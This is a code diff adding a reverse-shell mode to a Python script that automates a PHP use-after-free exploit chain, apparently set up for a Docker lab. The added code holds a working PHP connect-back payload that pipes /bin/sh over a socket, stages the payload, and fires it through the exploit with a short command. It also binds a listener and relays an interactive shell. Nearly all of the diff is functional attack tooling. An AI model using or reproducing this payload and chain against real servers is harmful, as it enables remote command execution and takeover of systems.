@@ -38,14 +38,19 @@ import argparse
 import json
 import os
 import re
+import socket
 import subprocess
 import sys
+import threading
+import time
 import urllib.error
 import urllib.request
 
 if hasattr(sys.stdout, "reconfigure"):
     sys.stdout.reconfigure(encoding="utf-8", errors="replace")
     sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+if hasattr(sys.stdin, "reconfigure"):
+    sys.stdin.reconfigure(encoding="utf-8", errors="replace")
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 
@@ -306,8 +311,9 @@ def run_poc(args, off, cmd):
         a += ["--proof-file", args.proof_file]
     else:
         a += ["--proof-file", ""]
-        warn("proof polling disabled — command may execute blind; "
-             "use --proof-file <host-path> (lab: lab/out/p) to confirm")
+        if not args.reverse:
+            warn("proof polling disabled — command may execute blind; "
+                 "use --proof-file <host-path> (lab: lab/out/p) to confirm")
     if off:
         a += ["--zif-offset", hex(off[0]), "--dtor-offset", hex(off[1])]
         if off[2]:
@@ -352,6 +358,170 @@ def run_v2(args, off, cmd):
     return subprocess.call(a)
 
 
+# ------------------------------------------------------------ reverse shell
+REVERSE_PHP = """<?php
+$s=fsockopen("{host}",{port});
+if(!$s){{exit;}}
+fwrite($s,"[+] reverse shell ready\\n");
+@file_put_contents("{proof}","reverse shell connected\\n");
+$d=array(0=>$s,1=>$s,2=>$s);
+proc_open("/bin/sh",$d,$p);
+"""
+
+
+def build_reverse_php(host, port, proof_target):
+    return REVERSE_PHP.format(host=host, port=port, proof=proof_target)
+
+
+def start_listener(host, port):
+    """Bind the local listener that receives the connect-back shell."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        s.bind((host, port))
+    except OSError as e:
+        try:
+            s.close()
+        except OSError:
+            pass
+        # distinguish "port already in use" from system-reserved ranges
+        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            probe.connect(("127.0.0.1", port))
+            in_use = True
+        except OSError:
+            in_use = False
+        finally:
+            probe.close()
+        if in_use:
+            raise RuntimeError(
+                "port %d is already in use by another process — pick a free "
+                "one, e.g. --reverse 5555" % port) from e
+        raise RuntimeError(
+            "cannot bind %s:%d (%s) — the port may be in a Windows-reserved "
+            "range; try another port, e.g. --reverse 5555"
+            % (host, port, e)) from e
+    s.listen(4)
+    return s
+
+
+def relay_shell(conn, addr):
+    """Relay stdin/stdout between the local user and the remote shell."""
+    ok("reverse shell connected from %s:%d" % addr)
+    print("[*] interactive shell — type commands; Ctrl+D / 'exit' to quit",
+          flush=True)
+
+    def pipe_out():
+        try:
+            while True:
+                data = conn.recv(4096)
+                if not data:
+                    break
+                sys.stdout.buffer.write(data)
+                sys.stdout.buffer.flush()
+        except OSError:
+            pass
+
+    t = threading.Thread(target=pipe_out, daemon=True)
+    t.start()
+    try:
+        while True:
+            try:
+                line = input("sh> ")
+            except (EOFError, KeyboardInterrupt):
+                break
+            if line.strip() in ("exit", "quit"):
+                break
+            try:
+                conn.sendall((line + "\n").encode())
+            except OSError:
+                break
+    finally:
+        try:
+            conn.close()
+        except OSError:
+            pass
+    print("\n[*] shell closed", flush=True)
+
+
+def reverse_flow(args, off):
+    """Stage a PHP connect-back payload, then run the chain with
+    `php</stage` (10 bytes) and hand the shell back to the user."""
+    rev = args.reverse
+    if ":" in rev:
+        host, _, port = rev.rpartition(":")
+        port = int(port)
+    else:
+        # lab default: container reaches the Docker host via host.docker.internal
+        host, port = "host.docker.internal", int(rev)
+
+    # local listener (0.0.0.0 unless the user pinned a host)
+    bind_host = "0.0.0.0" if host == "host.docker.internal" else host
+
+    # default stage host: the lab bind mount (lab/out -> /out) when present,
+    # otherwise the local out/ dir
+    default_stage = os.path.join(HERE, "lab", "out", "c")
+    if not os.path.isdir(os.path.join(HERE, "lab", "out")):
+        default_stage = os.path.join(HERE, "out", "c")
+    stage_host = args.stage_host or default_stage
+    stage_target = args.stage_target or "/out/c"
+    # in the lab, poll the mounted proof so stage 3 stops at attempt 1
+    if not args.proof_file and os.path.isdir(os.path.join(HERE, "lab", "out")):
+        args.proof_file = os.path.join(HERE, "lab", "out", "p")
+    proof_target = args.proof_target or "/out/p"
+
+    payload = build_reverse_php(host, port, proof_target)
+    os.makedirs(os.path.dirname(stage_host), exist_ok=True)
+    with open(stage_host, "w") as f:
+        f.write(payload)
+    log("staged payload at %s (container path: %s)" % (stage_host, stage_target))
+    log("connect-back target: %s:%d" % (host, port))
+
+    try:
+        listener = start_listener(bind_host, port)
+    except RuntimeError as e:
+        warn(str(e))
+        return 1
+    log("listening on %s:%d (allow inbound if Windows Firewall asks)"
+        % (bind_host, port))
+
+    cmd = "php<%s" % stage_target   # 10 bytes: fits the 14-byte carrier cap
+    engine = args.engine
+    if engine == "auto":
+        engine = "poc"
+    if engine == "poc":
+        rc = run_poc(args, off, cmd)
+    elif engine == "3em0":
+        rc = run_exploit3em0(args, off, cmd)
+    else:
+        rc = run_v2(args, off, cmd)
+
+    # wait for the connect-back (already pending in the backlog, or arrives
+    # while worker retries rotate)
+    deadline = time.time() + args.reverse_timeout
+    conn = None
+    addr = None
+    listener.settimeout(1.0)
+    while time.time() < deadline:
+        try:
+            conn, addr = listener.accept()
+            break
+        except socket.timeout:
+            continue
+        except OSError:
+            break
+    try:
+        listener.close()
+    except OSError:
+        pass
+    if conn is None:
+        warn("no connect-back within %ds — chain may have failed"
+             % args.reverse_timeout)
+        return 1
+    relay_shell(conn, addr)
+    return rc
+
+
 def main():
     ap = argparse.ArgumentParser(
         description="PHP2Shell UAF chain (CVE-2026-109618/619) — automated",
@@ -370,6 +540,20 @@ def main():
     ap.add_argument("--proof-file", default="",
                     help="host path polled for the proof after stage 3 "
                          "(lab: lab/out/p with -c 'id>/out/p')")
+    ap.add_argument("--reverse", default="",
+                    help="reverse shell mode: LPORT or LHOST:LPORT "
+                         "(listener runs here; payload connects back)")
+    ap.add_argument("--stage-host", default="",
+                    help="host path of the staged PHP payload "
+                         "(default: out/c)")
+    ap.add_argument("--stage-target", default="",
+                    help="container path of the staged payload "
+                         "(default: /out/c — the lab mount)")
+    ap.add_argument("--proof-target", default="",
+                    help="container path touched by the payload as proof "
+                         "(default: /out/p)")
+    ap.add_argument("--reverse-timeout", type=int, default=90,
+                    help="seconds to wait for the connect-back")
     ap.add_argument("--force", action="store_true",
                     help="skip gates (passes --force/--no-gate to the engine)")
     ap.add_argument("--allow-unsupported", action="store_true",
@@ -453,6 +637,8 @@ def main():
             engine = "3em0"
         else:
             engine = "v2"
+    if a.reverse:
+        return reverse_flow(a, off)
     if engine == "poc":
         rc = run_poc(a, off, a.cmd)
     elif engine == "3em0":
